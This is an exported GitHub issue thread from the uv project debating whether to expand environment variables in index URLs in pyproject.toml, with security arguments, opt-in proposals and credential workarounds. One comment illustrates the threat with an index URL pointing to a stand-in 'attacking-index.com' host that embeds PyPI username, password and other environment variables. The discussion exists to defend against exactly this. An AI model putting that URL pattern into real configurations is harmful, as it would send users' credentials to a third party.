```yaml
number: 5734
title: Expand environment variables in user-provided index URLs
type: issue
state: open
author: charliermarsh
labels:
  - compatibility
  - needs-decision
assignees: []
created_at: 2024-08-02T19:32:33Z
updated_at: 2025-10-09T08:47:39Z
url: https://github.com/astral-sh/uv/issues/5734
synced_at: 2026-01-12T15:58:58Z
```

# Expand environment variables in user-provided index URLs

---

_@charliermarsh_

Right now, we only support expansion (1) by the shell (of course) and (2) in requirements files. But the following don't expand:

- `cargo run pip install flask --index-url 'https://${PYPI_USERNAME}.com/repository/pypi-proxy/simple/flask/'`
- Anything in a `uv.toml` or `pyproject.toml` file


---

_Label `compatibility` added by @charliermarsh on 2024-08-02 19:32_

---

_Comment by @charliermarsh on 2024-08-02 20:42_

It looks like pip does _not_ support either of these.

---

_Comment by @charliermarsh on 2024-08-02 20:43_

Poetry does not support the latter: https://github.com/python-poetry/poetry/issues/208

---

_Comment by @charliermarsh on 2024-08-02 20:44_

Rust does not support this but the issue is not closed: https://github.com/rust-lang/cargo/issues/10789

---

_Comment by @charliermarsh on 2024-08-02 20:48_

I am not strictly opposed to it but we should get some more opinions (\cc @zanieb @BurntSushi @konstin).

---

_Comment by @chrisrodrigue on 2024-08-02 21:31_

PDM supports this:  [Store credentials with the index](https://pdm-project.org/latest/usage/config/#store-credentials-with-the-index), [Local dependencies](https://pdm-project.org/latest/usage/dependency/#local-dependencies)

---

_Comment by @chrisrodrigue on 2024-08-02 21:31_

Hatch also supports this: [Context formatting](https://hatch.pypa.io/latest/config/context/#context-formatting)

---

_Comment by @eth3lbert on 2024-08-02 22:23_

I looked around Poetry's document and found this https://python-poetry.org/docs/configuration/#http-basicnameusernamepassword .

---

_Comment by @CoolCat467 on 2024-08-03 06:39_

I know I'm not a maintainer of uv, but I strongly suggest that if environment lookups were added that they be opt-in. I've heard of things going very bad security wise from environment variables.

---

_Comment by @zanieb on 2024-08-03 14:10_

Can you share more details or examples please @CoolCat467?

---

_Comment by @zanieb on 2024-08-03 14:14_

Something like `--allow-variable <NAME>` might make sense for opt-in per-variable. We probably want to consider how we want the UX to work for lockfiles and credentials in general. I think expanding environment variables is probably not the best solution, it seems like we'd be better off finding a matching URL in our configuration file and pulling authentication from there (we need and want to support declaring indexes anyway).

---

_Comment by @eth3lbert on 2024-08-03 14:14_

Cargo has https://doc.rust-lang.org/cargo/reference/config.html#env

Might not directly related but there's also https://doc.rust-lang.org/cargo/reference/config.html#credentials.

---

_Comment by @chrisrodrigue on 2024-08-03 17:38_

Related: #5119

---

_Comment by @chrisrodrigue on 2024-08-03 18:12_

@CoolCat467 
> I know I'm not a maintainer of uv, but I strongly suggest that if environment lookups were added that they be opt-in. I've heard of things going very bad security wise from environment variables.

Currently `uv.lock` exposes API keys in source URLs which means a lot of users can’t check it into version control.

One of the strengths of environment variables is avoiding version control. Most VCSs support masking environment variables from job/log output when expanded. See [GitLab](https://docs.gitlab.com/ee/ci/variables/#mask-a-cicd-variable) and [GitHub](https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions#example-masking-an-environment-variable) docs.

They aren’t 100% foolproof. I think there’s a tradeoff between flexibility and security.


---

_Comment by @BurntSushi on 2024-08-05 14:01_

> `cargo run pip install flask --index-url 'https://${PYPI_USERNAME}.com/repository/pypi-proxy/simple/flask/'`

I think I would personally find it very surprising if an environment variable got expanded here. Basically, if I'm running a Unix shell command and I use single quotes, I have a very strong prior that the string is interpreted literally with no interpolation.

> Something like `--allow-variable <NAME>` might make sense for opt-in per-variable. We probably want to consider how we want the UX to work for lockfiles and credentials in general. I think expanding environment variables is probably not the best solution, it seems like we'd be better off finding a matching URL in our configuration file and pulling authentication from there (we need and want to support declaring indexes anyway).

:+1: on this (including that env vars are maybe not the best solution to this specific problem), but having an explicit `--allow-variable` I think would help mitigate some concerns here.

---

_Label `needs-decision` added by @charliermarsh on 2024-08-06 19:39_

---

_Comment by @jfgordon2 on 2024-08-22 04:47_

I'm currently looking at using uv instead of pipenv for our projects, and env var expansion is something we use with pipenv and our AWS CodeArtifact repo.  Not having this makes things a bit more complicated to use uv (i.e. we can't easily specify in the pyproject.toml file where the packages are located without constant updates since the index url contains the auth and it's only good for a limited time).

I'm not sure I understand the concern around env var expansion within a url for this use-case, though.

---

_Comment by @woutervh on 2024-10-01 08:24_

"opt-in variables"?  because you don't trust your own environment-variables? That makes zero sense to me.

> Currently uv.lock exposes API keys in source URLs which means a lot of users can’t check it into version control.

The source-urls in the lockfile could just use the verbatim non-resolved strings "https://${PYPI_USERNAME}:${PYPI_USERNAME}..." 

---

_Comment by @paveldikov on 2024-10-15 09:46_

Coming from a very strongly-regulated background, hard agree with @CoolCat467. IMHO security-by-default is _the way_. I am not strictly opposed to the feature, but if it is to be implemented I believe it should not be on by default.

_(also, TBH, I struggle to understand the use case... if you want to interpolate secrets from env vars, why not just pass `UV_EXTRA_INDEX_URL`? Are we trying to over-compensate for UX gaps in CI/CD platforms?)_

---

People have been bitten countless times by tools doing insecure-by-default behaviours (NGINX and Docker are my two favourite examples). I'd really rather not be in the position of having to bolt-on extra security on top of `uv`.

> because you don't trust your own environment-variables? 

As ridiculous/paranoid as it may sound to those not in heavily-regulated fields -- nope, I do not trust my own env vars not to get leaked. This happens all the time, and if you are especially unfortunate, can lead to multi-billion $$$ costs.

And although solutions such as in-line log filters may do a decent job at scrubbing secrets out of stdout/stderr... those are still best-effort. And there are countless other places I could leak my secrets -- e.g. I could inadvertently publish them as part of my wheel/container image/rpm/deb. Obviously no one will really want to do the latter, but as `uv`'s functionality and complexity grows, it is not impossible to think of an evolutionary path where this sort of vulnerability takes shape.

---

_Comment by @woutervh on 2024-10-15 22:34_

@paveldikov You argue against putting secrets in environment variables, because they might be leaked (see uv.lock). OK, Then don't.  I worked for years in the pharma-industry, and currently work in another highly regulated industry.

I fail to see a structural difference between putting your secrets in UV_INDEX_URL or in a extrapolated variable in pyproject.toml.
I fail to see why the former would be more safe than the latter.

---

_Comment by @paveldikov on 2024-10-15 23:26_

@woutervh 
> You argue against putting secrets in environment variables, because they might be leaked (see uv.lock). OK, Then don't.

This is actually not what I am saying. I do happen to dislike secrets-in-environment-variables, but I am not actually _arguing against them_. I am well aware that they are a fact of life in a number of commonly-used CI/CD platforms.

What I am rather saying is that this feature should not be on _by default_. I'd be perfectly happy with an `allow-env-substitution` setting exposed in `{uv,pyproject}.toml`. So you'd have:

``` toml
index-url = "https://${PYPI_USERNAME}.com/repository/pypi-proxy/simple/flask/"
allow-env-substitution = true
```

Simple as that. I think it's a no-brainer: if you want the expressive-but-less-secure behaviour, add an extra line in your config, and be done with it.

---

_Comment by @DanCardin on 2024-10-16 01:25_

it feels like that setting would have to be itself an env var (or uv global setting) to make any sense to me...

Like if you're explicitly describing your index-url as having this special interpolation syntax, then obviously you'll always be setting that config value as true in conjunction (having it as false would never be correct).

To me it feels like the attack you're trying guard against is some package which sets `index-url = "https://attacking-index.com/${PYPI_USERNAME}/${PYPI_PASSWORD}/${OTHER_UNRELATED_ENV_VARS_TO_EXFILTRATE}"`, and naively `uv install`ing in that package might expose your env vars in an uncontrollable way?

The pyproject.toml author needn't fear their own project settings/values, afaict (again, because if you can control the url, you can control that setting. But perhaps you as the consumer of some unknown pyproject.toml maybe ought to fear using it if this feature exists. Whereas today where you're explicitly mapping a given domain to the credentials (with something like netrc or keychain), or supplying them directly through UV_* env vars.

---

_Comment by @paveldikov on 2024-10-16 09:05_

> But perhaps you as the consumer of some unknown pyproject.toml maybe ought to fear using it if this feature exists

Exactly. Two scenarios that come to mind immediately:
* installing 3rd party package from sdist
* CI/CD platform ran by an individual/team that is not directly responsible for the code that is being deployed.
  - 'trust' is funny one in this instance. The platform team generally trusts in the developer/code owner's _good intentions_, but not necessarily their _competence_. As such CI/CD owners go to quite some effort to implement guard rails to mitigate the risk of self-sabotage, in this instance, credential leakage/exfiltration.

(FWIW the idea of consuming an untrusted `pyproject.toml` which specifies an arbitrary/untrusted index -- even without interpolation -- terrifies me too. But that's a separate problem, and a very thorny one too)

---

_Comment by @DanCardin on 2024-10-16 12:02_

I'm not sure exactly what mitigation makes the most sense, but basically my point was that the operator of the environment ought to be the one controlling access (default or not) to this feature. e.g. environment variable or uv setting. Whereas it being enableable by the person controlling the pyproject.toml would be where I could see there being issues.

The other problem, if you take this issue seriously, would be that just enabling it or disabling it seems likely to not be particularly useful. If you're operating in a project that uses the feature, likely you'd just plop the enabling env var into a bashrc and go about your day, worse if it defaults on.

Akin to index credentials themselves (by keychain) seems like it'd need to be something that maps index domain (not name, seems like that would also be too easy to attack) to allowed env vars. It just starts to get very un-ergonomic very quick; unless perhaps it was a JIT approval the first time for a given index.

---

_Comment by @Kristina-Pianykh on 2024-10-22 08:41_

The problem with the first issue is the use of single quotes which tell bash to interpret the string literally. Use double quotes for string interpolation

---

_Comment by @dpnova on 2025-01-08 05:21_

Just posted this over on #10096 

would love to be able to do something like this:

```toml
[tool.uv.sources]
foo = { git = "https://${GITHUB_TOKEN}@github.com/fooco/foo.git" }
```
Agree with requiring an option to enable it.

Also open to other options to achieve the above of course.

---

_Comment by @remss on 2025-01-31 10:25_

An other use case it to allow users to set the mirror they want for a source.

For example

```toml
[[tool.uv.index]]
name = "torch-gpu"
url = "${TORCH_URL}"
explicit = true
```

The user could then set environment variable to what is convenient for him, like `TORCH_URL="https://download.pytorch.org/whl/cu121"` or a private mirror `TORCH_URL="https://mycompany.com/mirror-torch-cu121"` 

Cherry on top: support default variable value like Bash

```toml
[[tool.uv.index]]
name = "torch-gpu"
url = "${TORCH_URL:-https://download.pytorch.org/whl/cu121}"
explicit = true
```

Currently I don't see any way to change source URL without touching the .toml / .lock to define custom mirrors. So I think this feature request is important.


---

_Comment by @NixBiks on 2025-01-31 10:36_

I also have a use case where I need to install [`prodigy`](https://prodi.gy/docs/install#pip) which requires a licence key. According to their docs you can install prodigy like this

```
python -m pip install prodigy --extra-index-url https://XXXX-XXXX-XXXX-XXXX@download.prodi.gy
```

But it's not clear to me how one could add the dependency in `pyproject.toml` with `uv`.

---

_Comment by @CoolCat467 on 2025-01-31 15:42_

Try
```
uv add prodigy --extra-index-url https://XXXX-XXXX-XXXX-XXXX@download.prodi.gy
```
but do note this will create a `uv.lock` file

---

_Comment by @celsiusnarhwal on 2025-02-11 20:29_

> I also have a use case where I need to install [`prodigy`](https://prodi.gy/docs/install#pip) which requires a licence key. According to their docs you can install prodigy like this
> 
> ```
> python -m pip install prodigy --extra-index-url https://XXXX-XXXX-XXXX-XXXX@download.prodi.gy
> ```
> 
> But it's not clear to me how one could add the dependency in `pyproject.toml` with `uv`.

Not a Prodigy user, but I am pretty sure uv's [basic authentication support](https://docs.astral.sh/uv/configuration/indexes/#providing-credentials) should do the job.

For example:

```toml
# pyproject.toml

[[tool.uv.index]]
name = "prodigy"
url = "https://download.prodi.gy/index"
```

```shell
export UV_INDEX_PRODIGY_PASSWORD=YOUR_PRODIGY_LICENSE_KEY
uv add prodigy
```


---

_Comment by @vizeit on 2025-04-30 04:38_

Thanks @zanieb for the reference in #13206 
It will be very helpful to either get a solution for using environment variable or a workaround. Thank you maintainers of uv, great tool!

---

_Comment by @charliermarsh on 2025-05-07 15:16_

You should defined these as name indexes, and set the appropriate environment variables: https://docs.astral.sh/uv/configuration/indexes/#providing-credentials-directly

---

_Comment by @mattconway1984 on 2025-05-07 15:20_

> You should defined these as name indexes, and set the appropriate environment variables: https://docs.astral.sh/uv/configuration/indexes/#providing-credentials-directly

So does the following:

```[[tool.uv.index]]
name = "internal-proxy"
url = "https://example.com/simple"
```

```
export UV_INDEX_INTERNAL_PROXY_USERNAME=public
export UV_INDEX_INTERNAL_PROXY_PASSWORD=koala
```

result in a URL formed as:

`https://public:koala@example.com/simple`

---

_Comment by @charliermarsh on 2025-05-07 15:21_

Yes.

---

_Comment by @pt-hephtal on 2025-05-07 18:15_

> Just posted this over on [#10096](https://github.com/astral-sh/uv/issues/10096)
> 
> would love to be able to do something like this:
> 
> [tool.uv.sources]
> foo = { git = "https://${GITHUB_TOKEN}@github.com/fooco/foo.git" }
> Agree with requiring an option to enable it.
> 
> Also open to other options to achieve the above of course.

Thanks for the useful replies so far, Is there any recommendations on how to approach this?

---

_Comment by @mvechtomova on 2025-05-07 21:45_

> Just posted this over on [#10096](https://github.com/astral-sh/uv/issues/10096)
> 
> would love to be able to do something like this:
> 
> [tool.uv.sources]
> foo = { git = "https://${GITHUB_TOKEN}@github.com/fooco/foo.git" }
> Agree with requiring an option to enable it.
> 
> Also open to other options to achieve the above of course.

We got it working like:

[tool.uv.sources]
foo = { git = "https://${GITHUB_TOKEN}@github.com/fooco/foo.git", rev="<git commit hash>" }
It is not really supported as it seems, but we tested in on multiple OS. foo must be specified in dependencies list without any version.

---

_Comment by @pt-hephtal on 2025-05-12 11:01_

> > Just posted this over on [#10096](https://github.com/astral-sh/uv/issues/10096)
> > would love to be able to do something like this:
> > [tool.uv.sources]
> > foo = { git = "https://${GITHUB_TOKEN}@github.com/fooco/foo.git" }
> > Agree with requiring an option to enable it.
> > Also open to other options to achieve the above of course.
> 
> We got it working like:
> 
> [tool.uv.sources] foo = { git = "https://${GITHUB_TOKEN}@github.com/fooco/foo.git", rev="" } It is not really supported as it seems, but we tested in on multiple OS. foo must be specified in dependencies list without any version.

Hey Maria, thanks for the reply. I tried this locally with no luck.

I was wondering if you're running this in github actions or similar? If so, then the environment variable could be triggering [automatic token auth](https://docs.github.com/en/actions/security-for-github-actions/security-guides/automatic-token-authentication)

This made me realise I could;
Add the following to the `.git/config` of repo using the package for local dev...
```
[url "https://oauth2:${GITHUB_TOKEN}@github.com/"]
    insteadOf = https://github.com/
```

and the following in the `pyproject.toml`

```
dependencies = [
    "v-cool-private-package>=0.1.0",
]

[tool.uv.sources]
v-cool-private-package = { git = "https://github.com/org/v-cool-private-package.git", subdirectory = "directory/ifnotroot", rev = "main" }
```

It doesn't feel lovely, but works for now 😬 

---

_Comment by @msabramo on 2025-06-06 14:14_

> I'm not sure exactly what mitigation makes the most sense, but basically my point was that the operator of the environment ought to be the one controlling access (default or not) to this feature. e.g. environment variable or uv setting. Whereas it being enableable by the person controlling the pyproject.toml would be where I could see there being issues.
> 
> The other problem, if you take this issue seriously, would be that just enabling it or disabling it seems likely to not be particularly useful. If you're operating in a project that uses the feature, likely you'd just plop the enabling env var into a bashrc and go about your day, worse if it defaults on.
> 
> Akin to index credentials themselves (by keychain) seems like it'd need to be something that maps index domain (not name, seems like that would also be too easy to attack) to allowed env vars. It just starts to get very un-ergonomic very quick; unless perhaps it was a JIT approval the first time for a given index.

I want to address the security concerns and people wanting environment variable substitution in `pyproject.toml` to have to be explicitly enabled in `pyproject.toml`, as shown below:

```toml
[[tool.uv.index]]
name = "artifactory"
url = "https://${ARTIFACTORY_USER}:${ARTIFACTORY_API_TOKEN}@artifactory.company.com/simple"
allow-env-substitution = true
```

### Key Points:
1. **Security Concerns**:  
   - The primary concern, raised by **@paveldikov** and others, is the risk of leaking environment variable values, especially when installing someone else's package.  
   - Within a project, using environment variable substitution seems safe since the project author and other project developers explicitly intend it and need it (Correct me if I'm wrong). However, the risk arises when the package is published and consumed by others. In others, the concern is specifically for **consumers** of the project and not **developers** of the project (but again, correct me if I'm wrong).

2. **Consumer Control**:  
   - As **@DanCardin** suggests, the decision to enable environment variable substitution should rest with the **consumer** of the package and not the package developer (who clearly needs the feature to be enabled).

### Proposed Solution:
- **Default Behavior**:  
  `uv` should globally default to **disabling** environment variable substitution to prioritize security (secure by default).  
- **Error Handling**:  
  If a user runs a `uv` command to install a package using interpolation syntax, they should receive a warning explaining:  
  - The package requires environment variable substitution.  
  - How to proceed, depending on whether they want to allow this feature or not
  - A link to detailed documentation on the security implications of enabling the feature.  
  - To make this more concrete, the warning could look something like this:
    ```
    Warning: uv environment variable substitution in pyproject.toml files is disabled.
    
    The package 'foo' requires environment variable substitution for an index URL:
    url = "https://${ARTIFACTORY_USER}:${ARTIFACTORY_API_TOKEN}@artifactory.company.com/simple"
    
    Allow? (N/y/a): 
      N - Disallow environment variable substitution (default)
      y - Allow environment variable substitution just once
      a - Allow environment variable substitution always (this will add the following to ~/.config/uv/uv.toml:
              [settings]
              enable-env-var-substitution = true
    
    For more details on enabling this feature and its security implications, visit:
    https://example.com/docs/uv/env-var-substitution
    ```

- **Optional Exception**:  
  Optionally, an exception could be made for `uv sync` when processing a `pyproject.toml` in the same directory as the command invocation. This would allow environment variable substitution in this specific case. Maybe this is an exception that adds unwarranted maintenance complexity though?

### User Choice:
- Users valuing convenience can enable the feature.  
- Those prioritizing security can leave it disabled.

---

**Note**: PR #13879 does not implement this proposal but can be updated based on further discussion and consensus.

---

_Comment by @msabramo on 2025-06-06 15:05_

Possibly sort of a tangent, but I also wonder if the **real** concern here is not so much environment variable substitution as the **URLs** (or **domains** really) that `uv` is perhaps unexpectedly reaching out to...? If you're installing some package and it's fetching from https://attacking-index.com, that seems like a concern, even if no environment variables are involved.

I think this might be what @paveldikov is alluding to with this commment?

> (FWIW the idea of consuming an untrusted pyproject.toml which specifies an arbitrary/untrusted index 
> -- even without interpolation -- terrifies me too. 
> But that's a separate problem, and a very thorny one too)

In other words, maybe the **real** concern here is that this feature causes `uv` to fetch from something like:
https://joeuser:xyz123@artifactory.company.com/simple or even https://attacking-index.com/simple

and maybe **that's** what they weren't expecting?

If that is the fear, then I wonder if the best thing for security is for `uv` to not use new URLs without the user's permission. That might look like:

```
Warning: The package 'foo' wants to make HTTP requests to

url = "https://${ARTIFACTORY_USER}:${ARTIFACTORY_API_TOKEN}@artifactory.company.com/simple"

Allow? (N/y/a): 
  N - Disallow (default)
  y - Allow just once
  a - Allow environment variable substitution always (this will add the following to ~/.config/uv/uv.toml:
          [[index]]
          url = "https://${ARTIFACTORY_USER}:${ARTIFACTORY_API_TOKEN}@artifactory.company.com/simple"

For more details on enabling this feature and its security implications, visit:
https://example.com/docs/uv/index-allow-list
```

So this is a different and orthogonal paradigm perhaps for handling security concerns. Instead of controlling the access to environment variables, we're controlling access to domains. Kind of analogous to all the security features that browsers have for same origin and what not, which perhaps could be a good inspiration for what `uv` could do.

That I think would probably be a separate issue from this one, because it doesn't really have to do with environment variables. Any unexpected index URL I would think could be a security concern, even if it doesn't use environment variables - e.g.:

```toml
[[tool.uv.index]]
url = "https://attacking-index.com/simple"
```

I could even imagine that in certain super-security-conscious environments, they may want to use their own internal package index only and not even reach out to **PyPI**. A user in such an environment I could imagine might **want** to get this warning the first time they use `uv`:

```
Warning: The package 'foo' wants to make HTTP requests to

url = "https://pypi.org/simple/"

Allow? (N/y/a): 
  N - Disallow (default)
  y - Allow just once
  a - Allow environment variable substitution always (this will add the following to ~/.config/uv/uv.toml:
          [[index]]
          url = "https://pypi.org/simple/"

For more details on enabling this feature and its security implications, visit:
https://example.com/docs/uv/index-allow-list
```

OTOH, maybe folks who are that security-conscious would have firewall rules that block https://pypi.org/simple/ and so maybe `uv` doesn't need to put a fairly annoying inconvenience on most users for the small minority that don't trust PyPI and don't have other security measures.

I am wondering if we are putting too much burden on `uv` to solve this problem when it should be solved at a higher level like the operating system and/or firewall. Because `uv` is just one tool and don't you want every program on every computer in your network to not be able to talk to https://attacking-index.com?

When I worked in a research job at a lab funded by government a long time ago, the most security-conscious work was done in an area where they disallowed all Internet access. Everything they used came from the internal network. And the USB ports were disabled so that USB memory sticks weren't an attack vector.

My point is that the best thing for security are comprehensive measures and having very granular security controls within this one tool called `uv` might not be worth the trouble of the complexity they add.

---

_Comment by @vanhumbeecka on 2025-10-09 08:47_

I get the security concerns about ENV variables in the `pyproject.toml`.

-> So what about a different approach?

Can we have a `pyproject.local.toml` that is `.gitignored` ?
Then `uv` can merge the contents of both `pyproject.toml` (version controlled) and `pyproject.local.toml` (non-version controlled) and we get the behaviour we actually want?

```toml
# pyproject.local.toml
[tool.uv.sources]
my-private-package = { path = /my/local/path, editable = true }
```

```toml
# pyproject.toml -> this part will get overwritten if the same is found in an existing `pyproject.local.toml`
[tool.uv.sources]
my-private-package = { path = /dummy/path, editable = true }
```

---
